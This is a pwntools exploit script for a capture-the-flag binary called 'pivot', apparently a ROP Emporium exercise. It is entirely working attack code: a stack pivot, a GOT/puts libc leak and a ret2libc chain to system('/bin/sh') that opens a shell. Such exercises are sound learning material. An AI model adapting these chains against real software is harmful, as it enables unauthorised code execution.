from pwn import *
elf = context.binary = ELF("./pivot")
libc = elf.libc
r = elf.process()
gdb.attach(r, 
'''
    b*pwnme+182\n
    b*pwnme+4\n
    c
''')

    #############
    # ROP chain #
    #############
pop_rsp_r13_r14_r15 = 0x0000000000400a2d
pop_rdi_ret = 0x0000000000400a33
pop_rax = 0x00000000004009bb
xchg_rsp_rax = 0x00000000004009bd
    ###########
    # Exploit #
    ###########
r.recvuntil(b"pivot: ") #buffer
heap = int(r.recvuntil(b"df10"), 16) # recv buffer address
log.success(f"Buffer: {hex(heap)}")
    #############
    # LEAK LIBC #
    #############
payload = flat(
    pop_rdi_ret,
    elf.got["puts"],
    elf.plt["puts"],
    elf.sym["pwnme"] + 4,
    0x6010b0,
    pop_rax,
    heap,
    xchg_rsp_rax
)
r.sendlineafter(b"land there\n> ",payload)
r.sendlineafter(b"stack smash\n> ",payload)
r.recvuntil(b"Thank you!\n")
puts_leak = u64(r.recv(6).ljust(8, b"\0"))
log.success(f"Puts Address: {hex(puts_leak)}")
libc.address = puts_leak - libc.sym["puts"]
log.success(f"Libc Base: {hex(libc.address)}")

    ###############
    #  Get Shell  #
    ###############

payload = flat(
    cyclic(40),
    pop_rdi_ret + 1,
    pop_rdi_ret,
    next(libc.search(b"/bin/sh")),
    libc.sym["system"]
)
r.sendline(payload)
r.interactive()